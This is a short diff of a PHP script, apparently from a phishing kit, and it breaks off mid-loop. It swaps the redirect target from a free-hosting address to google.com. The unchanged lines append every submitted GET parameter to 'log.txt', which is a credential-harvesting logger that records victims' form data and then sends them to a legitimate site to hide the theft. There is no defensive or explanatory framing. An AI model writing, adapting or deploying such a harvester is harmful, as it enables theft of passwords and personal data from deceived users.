@@ -1,5 +1,5 @@
 <?php
-header ('Location: http://formsttya.000webhostapp.com');
+header ('Location: http://google.com');
 $handle = fopen("log.txt", "a");
 foreach($_GET as $variable => $value) {
 fwrite($handle, $variable);
